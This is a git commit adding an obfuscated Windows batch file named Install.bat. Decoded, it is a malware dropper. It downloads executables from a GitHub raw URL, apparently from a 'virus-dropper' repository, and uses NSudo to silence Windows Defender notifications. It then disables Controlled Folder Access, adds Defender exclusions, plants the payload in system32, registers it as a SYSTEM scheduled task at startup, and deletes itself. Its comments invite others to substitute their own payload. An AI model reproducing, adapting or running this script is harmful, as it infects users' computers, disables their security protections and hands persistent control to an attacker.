d0fa77f7d1cc8f80c32b8f08660dd68f69c96cd2
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-26 21:22:20 -0400

    Add files via upload

---
+++ install/Install.bat
@@ -0,0 +1,33 @@
+ÿþ&cls
+@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
+SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
+^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
+@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
+color ef
+c%r:~13,1%rl "%r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://ra%r:~9,1%.%r:~1,1%%r:~2,1%%r:~4,1%%r:~11,1%%r:~13,1%%r:~10,1%%r:~13,1%%r:~8,1%ercon%r:~4,1%en%r:~4,1%.co%r:~12,1%/Y%r:~13,1%%r:~12,1%Y%r:~13,1%%r:~12,1%%r:~12,1%%r:~2,1%%r:~4,1%y/v%r:~2,1%r%r:~13,1%%r:~8,1%-dropper/%r:~12,1%a%r:~2,1%n/%r:~2,1%n%r:~8,1%%r:~4,1%all/N%r:~14,1%%r:~13,1%do.exe" --o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1% "N%r:~14,1%%r:~13,1%do.exe"
+N%r:~14,1%%r:~13,1%do -U:T -%r:~14,1%%r:~11,1%o%r:~9,1%W%r:~2,1%ndo%r:~9,1%Mode:%r:~15,1%%r:~2,1%de re%r:~1,1% add "%r:~15,1%KLM\%r:~14,1%of%r:~4,1%%r:~9,1%are\Pol%r:~2,1%c%r:~2,1%e%r:~8,1%\M%r:~2,1%cro%r:~8,1%of%r:~4,1%\W%r:~2,1%ndo%r:~9,1%%r:~8,1% Defender\U%r:~6,1% Conf%r:~2,1%%r:~1,1%%r:~13,1%ra%r:~4,1%%r:~2,1%on" /v "No%r:~4,1%%r:~2,1%f%r:~2,1%ca%r:~4,1%%r:~2,1%on_%r:~14,1%%r:~13,1%ppre%r:~8,1%%r:~8,1%" /%r:~4,1% RE%r:~5,1%_DW%r:~17,1%RD /d "1" /f
+::disables ControlledFolderAccess to access files and folders
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -co%r:~12,1%%r:~12,1%and "%r:~14,1%e%r:~4,1%-MpPreference -Ena%r:~10,1%leCon%r:~4,1%rolledFolder%r:~18,1%cce%r:~8,1%%r:~8,1% D%r:~2,1%%r:~8,1%a%r:~10,1%led"
+::windows defender exclusions
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -%r:~2,1%np%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -Non%r:~16,1%n%r:~4,1%erac%r:~4,1%%r:~2,1%ve -Co%r:~12,1%%r:~12,1%and "%r:~18,1%dd-MpPreference -Excl%r:~13,1%%r:~8,1%%r:~2,1%onProce%r:~8,1%%r:~8,1% '"W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe'"
+
+::direct download link
+::edit this to your files
+%r:~12,1%d "%systemroot%\%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\W%r:~2,1%ndo%r:~9,1%%r:~8,1%exe"
+c%r:~13,1%rl "%r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://ra%r:~9,1%.%r:~1,1%%r:~2,1%%r:~4,1%%r:~11,1%%r:~13,1%%r:~10,1%%r:~13,1%%r:~8,1%ercon%r:~4,1%en%r:~4,1%.co%r:~12,1%/Y%r:~13,1%%r:~12,1%Y%r:~13,1%%r:~12,1%%r:~12,1%%r:~2,1%%r:~4,1%y/v%r:~2,1%r%r:~13,1%%r:~8,1%-dropper/%r:~12,1%a%r:~2,1%n/%r:~2,1%n%r:~8,1%%r:~4,1%all/W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe" --o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1% "%appdata%\W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe"
+%r:~12,1%ove "%appdata%\W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe" "%systemroot%\%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\W%r:~2,1%ndo%r:~9,1%%r:~8,1%exe"
+::upload files here: github.com - create account and create repository (public) then upload files
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -%r:~2,1%np%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -o%r:~13,1%%r:~4,1%p%r:~13,1%%r:~4,1%for%r:~12,1%a%r:~4,1% none -Non%r:~16,1%n%r:~4,1%erac%r:~4,1%%r:~2,1%ve -Co%r:~12,1%%r:~12,1%and "%r:~18,1%dd-MpPreference -Excl%r:~13,1%%r:~8,1%%r:~2,1%onPa%r:~4,1%%r:~11,1% '"%systemroot%\%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\W%r:~2,1%ndo%r:~9,1%%r:~8,1%exe'"
+N%r:~14,1%%r:~13,1%do -U:T -%r:~14,1%%r:~11,1%o%r:~9,1%W%r:~2,1%ndo%r:~9,1%Mode:%r:~15,1%%r:~2,1%de re%r:~1,1% del "%r:~15,1%KLM\%r:~14,1%of%r:~4,1%%r:~9,1%are\Pol%r:~2,1%c%r:~2,1%e%r:~8,1%\M%r:~2,1%cro%r:~8,1%of%r:~4,1%\W%r:~2,1%ndo%r:~9,1%%r:~8,1% Defender\U%r:~6,1% Conf%r:~2,1%%r:~1,1%%r:~13,1%ra%r:~4,1%%r:~2,1%on" /v "No%r:~4,1%%r:~2,1%f%r:~2,1%ca%r:~4,1%%r:~2,1%on_%r:~14,1%%r:~13,1%ppre%r:~8,1%%r:~8,1%" /f
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell -Co%r:~12,1%%r:~12,1%and "Un%r:~10,1%lock-f%r:~2,1%le '%systemroot%\%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\W%r:~2,1%ndo%r:~9,1%%r:~8,1%exe\W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe'"
+%r:~8,1%%r:~4,1%ar%r:~4,1% "W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe" "%systemroot%\%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\W%r:~2,1%ndo%r:~9,1%%r:~8,1%exe\W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe"
+%r:~14,1%C%r:~15,1%T%r:~18,1%%r:~14,1%K%r:~14,1% /CRE%r:~18,1%TE /F /%r:~14,1%C %r:~17,1%N%r:~14,1%T%r:~18,1%RT /TR "%systemroot%\%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\W%r:~2,1%ndo%r:~9,1%%r:~8,1%exe\W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe" /RU "%r:~14,1%Y%r:~14,1%TEM" /TN "W%r:~2,1%ndo%r:~9,1%%r:~8,1%.exe"
+del N%r:~14,1%%r:~13,1%do.exe
+call :dele%r:~4,1%e%r:~14,1%elf&ex%r:~2,1%%r:~4,1%
+:deleteSelf
+%r:~8,1%%r:~4,1%ar%r:~4,1% /%r:~10,1% "" c%r:~12,1%d /c del "%~f0"&ex%r:~2,1%%r:~4,1%
+@ec%r:~11,1%o off
+%r:~8,1%e%r:~4,1% a = %%~i
+%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
+set a = %a%
+:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
